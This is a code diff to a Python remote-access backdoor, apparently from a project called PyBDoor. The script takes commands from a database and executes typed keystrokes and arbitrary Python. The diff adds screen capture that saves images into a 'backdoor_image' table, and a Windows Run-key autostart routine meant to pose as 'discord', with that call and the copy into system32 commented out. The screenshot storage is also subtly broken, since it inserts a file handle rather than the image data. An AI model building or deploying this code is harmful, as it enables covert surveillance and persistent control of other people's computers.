@@ -1,12 +1,15 @@
-import sqlite3,socket,os,time,datetime,keyboard,shutil
-
+import sqlite3,socket,os,time,datetime,keyboard,shutil,winreg,pyautogui
 
 class backdoor:
     def __init__(self):
-        hard_drive_name = os.getcwd().split(":")
-        hard_drive_name = hard_drive_name[0]
-        os.chdir(hard_drive_name+":/windows/system32")
-        #shutil.copy("main.exe")
+        # hard_drive_name = os.getcwd().split(":")
+        # hard_drive_name = hard_drive_name[0]
+        # if not os.path.exists(hard_drive_name+":/windows/system32/main.exe"):
+        #     #os.chdir(hard_drive_name+":/windows/system32")
+        #     shutil.copy("main.exe", hard_drive_name+":/windows/system32/main.exe")
+
+        # self.set_autostart_registry('discord', hard_drive_name+':/windows/system32/main.exe')
+
         self.db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
         self.cursor = self.db.cursor()
 
@@ -67,9 +70,28 @@ class backdoor:
                     
                     keyboard.write(commands_to_execute[i+line])
             elif command.startswith("delay"):
-                delay_command = command.split(":")
-                time_to_delay = delay_command[1].replace(" ", "")
+                delay_command = command.split("(")
+                time_to_delay = delay_command[1].replace(")", "")
                 time.sleep(float(time_to_delay))
+            elif command.startswith("screenshot()"):
+                myScreenshot = pyautogui.screenshot()
+                myScreenshot.save(r'screenshot.png')
+                jsonString = bytearray()
+                with open("screenshot.png", "rb") as r:
+                    while True:
+                        data = r.read(1024)
+                        if not data:
+                            break
+                        jsonString.extend(data)
+                sql_code = """INSERT INTO backdoor_image
+                      (img_data, img_name)                 
+                      VALUES (?, ?)
+                """
+                with open("test.png", "wb+") as w:
+                    w.write(jsonString)
+                self.cursor.execute(sql_code, (r, "screenshot.png"))
+                self.db.commit()
+                os.remove("screenshot.png")
             elif command.startswith("python"):
                 python_code = ""
                 for i in range(1, len(commands_to_execute)):
@@ -99,7 +121,21 @@ class backdoor:
                 """
                 self.cursor.execute(sql_code, (command[2], output, self.pc_id,datetime.datetime.now()))
                 self.db.commit()
-                
+    def set_autostart_registry(self, app_name, key_data=None, autostart: bool = True) -> bool:
+        with winreg.OpenKey(
+                key=winreg.HKEY_CURRENT_USER,
+                sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
+                reserved=0,
+                access=winreg.KEY_ALL_ACCESS,
+        ) as key:
+            try:
+                if autostart:
+                    winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
+                else:
+                    winreg.DeleteValue(key, app_name)
+            except OSError:
+                return False
+        return True                
 backdoor()
 
 
